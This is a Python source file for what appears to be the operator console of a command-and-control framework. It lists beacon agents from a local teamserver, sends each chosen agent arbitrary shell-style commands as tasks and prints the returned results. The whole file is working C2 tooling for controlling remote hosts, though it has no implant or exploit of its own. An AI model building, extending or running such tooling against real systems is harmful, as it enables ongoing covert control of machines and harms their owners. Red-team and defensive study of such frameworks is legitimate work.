import requests
import time
from dataclasses import dataclass

@dataclass
class Agent:
    IP: str
    Hostname: str
    Sleep: str
    UID: str
    
@dataclass
class CommandData:
    CommandID: str
    Command: str

@dataclass
class Client:
    Agent_List: list[Agent]
    AgentID: str = ""
    AgentHostname: str = ""
    AgentIP: str = ""
    Tasks: list[str] = None
    Beacon_Sleep: str = ""
    Teamserver: str = ""

    @classmethod
    def get_agents(cls, URL: str):
        try:
            URL = URL + "/agents"
            response = requests.get(URL)
            if response.status_code == 200:
                return response.json()['agents']
        except Exception as e:
            print(e)

    def send_task(self, task: str):
        try:
            URL = self.Teamserver + "/tasks/" + self.AgentID
            data = {
                "CommandID": "",
                "Command": task,
            }
            response = requests.post(URL, json=data)
            if response.status_code == 200:
                return response.json()
        except Exception as e:
            print(e)
    
    def get_results(self):
        try:
            URL = self.Teamserver + "/results/" + self.Tasks
            print(URL)
            response = requests.get(URL)
            if response.status_code == 200:
                return response.json()
        except Exception as e:
            print(e)
            

    def __init__(self, TEAMSERVER: str):
        self.Agent_List = self.get_agents(TEAMSERVER)
        self.Teamserver = TEAMSERVER

    def display_agents(self):
        for num, agent in enumerate(self.Agent_List, start=1):
            print(f"{num}. {agent['Hostname']}@{agent['IP']} | {agent['UID']}")
    
    def choose_agent(self, num):
        self.AgentID = self.Agent_List[num]['UID']
        self.Beacon_Sleep = self.Agent_List[num]['Sleep']
        self.AgentHostname = self.Agent_List[num]['Hostname']
        self.AgentIP = self.Agent_List[num]['IP']
    
    def reset_agent(self):
        self.AgentID = ""
        self.Beacon_Sleep = ""
        self.AgentHostname = ""
        self.AgentIP = ""


    

if __name__ == "__main__":
    client = Client("http://127.0.0.1:50050")
    while True:
        client.display_agents()
        beacon_id = input("> ")
        
        if beacon_id == "exit":
            break
        
        if beacon_id.isdigit():
            beacon_id = int(beacon_id)
            if beacon_id > len(client.Agent_List):
                print("[!] Invalid agent ID")
                continue
            else:
                client.choose_agent(beacon_id - 1)
                print(f"[*] Interacting with {client.AgentHostname}@{client.AgentIP} | {client.AgentID} (sleep: {client.Beacon_Sleep})")
                    
                
                while True:
                    task = input(f"{beacon_id} > ")
                    if task == "!":
                        break
                    
                    task_request = client.send_task(task)
                    client.Tasks = task_request['uid']
                    
                    print("[*] Waiting for beacon...")
                    
                    time.sleep(int(client.Beacon_Sleep) + 2)
                    
                    task_response = client.get_results()
                    
                    print(task_response['results']) 